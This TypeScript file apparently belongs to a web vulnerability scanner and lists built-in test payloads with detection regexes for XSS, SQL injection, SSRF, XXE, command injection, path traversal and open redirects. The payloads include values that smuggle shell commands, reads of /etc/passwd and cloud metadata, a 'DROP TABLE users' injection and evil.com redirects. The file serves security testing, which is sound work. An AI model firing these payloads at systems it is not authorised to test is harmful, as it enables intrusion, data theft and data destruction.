/**
 * Built-in security payloads
 * Curated, tested, fast defaults for common vulnerability categories
 */

import type { RuntimePayload, PayloadCategory } from "@vulcn/engine";

/**
 * Built-in payloads - curated, tested, fast defaults
 */
export const BUILTIN_PAYLOADS: Record<string, RuntimePayload> = {
  // XSS Payloads
  "xss-basic": {
    name: "xss-basic",
    category: "xss",
    description: "Basic XSS payloads with script tags and event handlers",
    source: "builtin",
    payloads: [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '"><script>alert("XSS")</script>',
      "javascript:alert('XSS')",
      '<svg onload=alert("XSS")>',
    ],
    detectPatterns: [
      /<script[^>]*>alert\(/i,
      /onerror\s*=\s*alert\(/i,
      /onload\s*=\s*alert\(/i,
      /javascript:alert\(/i,
    ],
  },
  "xss-event": {
    name: "xss-event",
    category: "xss",
    description: "XSS via event handlers",
    source: "builtin",
    payloads: [
      '" onfocus="alert(1)" autofocus="',
      "' onmouseover='alert(1)'",
      '<body onload=alert("XSS")>',
      "<input onfocus=alert(1) autofocus>",
      "<marquee onstart=alert(1)>",
      "<video src=x onerror=alert(1)>",
      "<audio src=x onerror=alert(1)>",
    ],
    detectPatterns: [
      /onfocus\s*=\s*["']?alert/i,
      /onmouseover\s*=\s*["']?alert/i,
      /onload\s*=\s*["']?alert/i,
      /onstart\s*=\s*["']?alert/i,
      /onerror\s*=\s*["']?alert/i,
    ],
  },
  "xss-svg": {
    name: "xss-svg",
    category: "xss",
    description: "XSS via SVG elements",
    source: "builtin",
    payloads: [
      '<svg/onload=alert("XSS")>',
      "<svg><script>alert(1)</script></svg>",
      "<svg><animate onbegin=alert(1)>",
      "<svg><set onbegin=alert(1)>",
      '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>">',
    ],
    detectPatterns: [
      /<svg[^>]*onload\s*=/i,
      /<svg[^>]*>.*<script>/i,
      /onbegin\s*=\s*alert/i,
    ],
  },
  "xss-polyglot": {
    name: "xss-polyglot",
    category: "xss",
    description: "XSS polyglot payloads that work in multiple contexts",
    source: "builtin",
    payloads: [
      "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
      "'\"-->]]>*/</script><script>alert(1)</script>",
      "<img src=x:x onerror=alert(1)//",
      "'-alert(1)-'",
      '"><img src=x onerror=alert(1)>',
    ],
    detectPatterns: [/alert\s*\(\s*\d*\s*\)/i, /<script>/i, /onerror\s*=/i],
  },

  // SQL Injection Payloads
  "sqli-basic": {
    name: "sqli-basic",
    category: "sqli",
    description: "Basic SQL injection payloads",
    source: "builtin",
    payloads: [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "1' OR '1'='1",
      "admin'--",
      "' UNION SELECT NULL--",
      "1; DROP TABLE users--",
    ],
    detectPatterns: [
      /sql.*syntax/i,
      /mysql.*error/i,
      /ORA-\d{5}/i,
      /pg_query/i,
      /sqlite.*error/i,
      /unclosed.*quotation/i,
    ],
  },
  "sqli-error": {
    name: "sqli-error",
    category: "sqli",
    description: "SQL injection payloads to trigger errors",
    source: "builtin",
    payloads: [
      "'",
      "''",
      "`",
      '"',
      "')",
      "'\"",
      "1' AND '1'='2",
      "1 AND 1=2",
      "1'1",
      "1 exec sp_",
    ],
    detectPatterns: [
      /sql.*syntax/i,
      /mysql.*error/i,
      /ORA-\d{5}/i,
      /postgresql.*error/i,
      /sqlite.*error/i,
      /quoted.*string.*properly.*terminated/i,
      /ODBC.*Driver/i,
      /Microsoft.*ODBC/i,
    ],
  },
  "sqli-blind": {
    name: "sqli-blind",
    category: "sqli",
    description: "Blind SQL injection payloads (timing-based)",
    source: "builtin",
    payloads: [
      "1' AND SLEEP(5)--",
      "1; WAITFOR DELAY '0:0:5'--",
      "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
      "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
      "1 AND SLEEP(5)",
    ],
    detectPatterns: [
      // Blind SQLi is detected by timing, not content patterns
    ],
  },
  "sqli-union": {
    name: "sqli-union",
    category: "sqli",
    description: "UNION-based SQL injection payloads",
    source: "builtin",
    payloads: [
      "' UNION SELECT NULL--",
      "' UNION SELECT NULL,NULL--",
      "' UNION SELECT NULL,NULL,NULL--",
      "' UNION SELECT 1,2,3--",
      "' UNION SELECT username,password FROM users--",
      "1 UNION SELECT ALL FROM information_schema.tables--",
    ],
    detectPatterns: [
      /sql.*syntax/i,
      /column.*count/i,
      /different.*number.*columns/i,
    ],
  },

  // SSRF Payloads
  "ssrf-basic": {
    name: "ssrf-basic",
    category: "ssrf",
    description: "Server-Side Request Forgery payloads",
    source: "builtin",
    payloads: [
      "http://localhost",
      "http://127.0.0.1",
      "http://[::1]",
      "http://169.254.169.254/latest/meta-data/",
      "http://metadata.google.internal/",
      "http://0.0.0.0",
      "file:///etc/passwd",
      "dict://localhost:11211/",
      "gopher://localhost:25/_HELO",
    ],
    detectPatterns: [
      /root:.*:0:0/i, // /etc/passwd content
      /ami-id/i, // AWS metadata
      /instance-id/i,
      /\{"Code"\s*:/i, // Cloud metadata JSON
    ],
  },

  // XXE Payloads
  "xxe-basic": {
    name: "xxe-basic",
    category: "xxe",
    description: "XML External Entity injection payloads",
    source: "builtin",
    payloads: [
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost">]><foo>&xxe;</foo>',
      '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><data>&file;</data>',
    ],
    detectPatterns: [
      /root:.*:0:0/i,
      /\[fonts\]/i, // win.ini content
      /\[extensions\]/i,
    ],
  },

  // Command Injection Payloads
  "cmd-basic": {
    name: "cmd-basic",
    category: "command-injection",
    description: "OS command injection payloads",
    source: "builtin",
    payloads: [
      "; id",
      "| id",
      "& id",
      "&& id",
      "|| id",
      "`id`",
      "$(id)",
      "; cat /etc/passwd",
      "| cat /etc/passwd",
      "& whoami",
      "| whoami",
      "; dir",
      "| dir",
    ],
    detectPatterns: [
      /uid=\d+\([\w]+\)/i, // Unix id command output
      /root:.*:0:0/i,
      /Volume Serial Number/i, // Windows dir output
      /Directory of/i,
    ],
  },

  // Path Traversal Payloads
  "path-traversal": {
    name: "path-traversal",
    category: "path-traversal",
    description: "Directory traversal payloads",
    source: "builtin",
    payloads: [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\win.ini",
      "....//....//....//etc/passwd",
      "..%2f..%2f..%2fetc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
      "..%252f..%252f..%252fetc/passwd",
      "/etc/passwd",
      "C:\\Windows\\win.ini",
    ],
    detectPatterns: [/root:.*:0:0/i, /\[fonts\]/i, /\[extensions\]/i],
  },

  // Open Redirect Payloads
  "open-redirect": {
    name: "open-redirect",
    category: "open-redirect",
    description: "Open redirect payloads for phishing",
    source: "builtin",
    payloads: [
      "//evil.com",
      "https://evil.com",
      "/\\evil.com",
      "//evil.com/%2f..",
      "////evil.com",
      "https:evil.com",
      "//evil%E3%80%82com",
      "javascript:alert(document.domain)",
    ],
    detectPatterns: [
      // Open redirects are detected by observing the redirect behavior
    ],
  },
};

/**
 * Get all built-in payload names
 */
export function getBuiltinPayloadNames(): string[] {
  return Object.keys(BUILTIN_PAYLOADS);
}

/**
 * Get all built-in categories
 */
export function getBuiltinCategories(): PayloadCategory[] {
  const categories = new Set<PayloadCategory>();
  for (const payload of Object.values(BUILTIN_PAYLOADS)) {
    categories.add(payload.category);
  }
  return Array.from(categories);
}
